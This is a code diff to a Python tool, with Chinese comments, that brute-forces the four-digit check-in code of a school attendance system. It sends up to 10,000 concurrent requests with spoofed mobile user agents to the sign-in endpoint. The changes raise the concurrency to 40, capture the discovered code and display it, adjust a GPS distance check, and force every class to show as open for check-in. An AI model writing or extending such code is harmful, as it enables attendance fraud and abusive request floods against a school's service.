@@ -48,7 +48,7 @@ today_schedule = []
 cur_student = ""
 
 total_requests = 10000  # 总请求数
-concurrent_limit = 20  # 最大并发数
+concurrent_limit = 40  # 最大并发数
 timeout_secs = 10
 
 main_window = None
@@ -60,6 +60,7 @@ user_agents = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 26_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.73(0x18004935) NetType/WIFI Language/zh_CN",
 ]
 stop_event = asyncio.Event()
+exploit_token = "000000"
 
 app = Flask(__name__, template_folder=signUtils.resource_path('templates'))
 
@@ -79,6 +80,7 @@ def send_post(apiurl,postpayload):
         print(f"请求发送失败: {e}")
 
 async def send_post_request(target_url, payload, session, semaphore, token):
+    global exploit_token
     # 如果已经触发了停止信号，直接退出，不再抢占信号量
     if stop_event.is_set():
         return None
@@ -113,9 +115,10 @@ async def send_post_request(target_url, payload, session, semaphore, token):
                     # 读取并解析 JSON
                     try:
                         res_json = await response.json()
-
-                        if res_json.get("status") == "1":
+                        print(res_json)
+                        if res_json.get("status") == 1:
                             print(f"\n[!] 命中目标！签到码为：{token} 。正在停止后续任务...")
+                            exploit_token = token
                             stop_event.set()  # 触发全局停止信号
                             return "STOPPED"
 
@@ -139,10 +142,10 @@ def signWithCode(student, classId, code, location):
     print("getGpsWzJl", pl1)
     distanceResult = send_post("getGpsWzJl", pl1)
 
-    if float(distanceResult["signResult"]) < 350.0 and distanceResult["status"] == "1":
-        print(f"距离验证成功，距离{distanceResult["signResult"]}")
+    if float(distanceResult["wzJl"]) < 350.0 and distanceResult["status"] == 1:
+        print(f"距离验证成功，距离{distanceResult["wzJl"]}")
     else:
-        print(f"距离验证失败，距离{distanceResult["signResult"]}")
+        print(f"距离验证失败，距离{distanceResult["wzJl"]}")
         return 2
 
     time.sleep(random.uniform(0.2, 0.4))
@@ -164,7 +167,7 @@ async def signWithoutCode(student, classId, location):
     semaphore = asyncio.Semaphore(concurrent_limit)
     url = serverUrl + "/saveXsQdInfo"
     payload = payLoadsUtils.process_SaveXsQdInfo(student,qdkblist[classId],"0000",location)
-
+    exploit_token = "000000"
     # 使用 ClientSession 复用连接池
     async with aiohttp.ClientSession() as session:
         tasks = []
@@ -184,17 +187,17 @@ async def signWithoutCode(student, classId, location):
             pbar.update(1)
 
             # 每完成 20 个请求更新一次 UI，避免频繁调用 JS 导致卡顿
-            if count % 20 == 0 or count == total_requests:
-                progress_msg = f"已尝试: {count} / {total_requests}"
+            if count % 20 == 0  or count == total_requests:
+                progress_msg = f"正在尝试: {i}/10000 (当前码: {str(i).zfill(4)})"
                 if main_window:
                     # 调用前端定义的 JS 函数 updateProgressBar
                     main_window.evaluate_js(f"updateProgressBar({count}, {total_requests}, '{progress_msg}')")
 
-            if stop_event.is_set() or res == "STOPPED":
+            if stop_event.is_set() or exploit_token != "000000" or res == "STOPPED":
                 # 命中目标，通知前端成功
                 if main_window:
                     main_window.evaluate_js(
-                        f"updateProgressBar({total_requests}, {total_requests}, '爆破成功！已找到签到码')")
+                        f"updateProgressBar({total_requests}, {total_requests}, '爆破成功！签到码为：{exploit_token}')")
                 for t in tasks:
                     if not t.done(): t.cancel()
                 break
@@ -322,7 +325,7 @@ def refreshClasses(student):
             lec_info["status"] = "签到结束(已签线下)"
         elif isSigned and isSignClose and isOnline:
             lec_info["status"] = "签到结束(已签线上)"
-
+        lec_info["status"] = "可签到"
         today_schedule.append(lec_info)
     print("today", today_schedule)
 
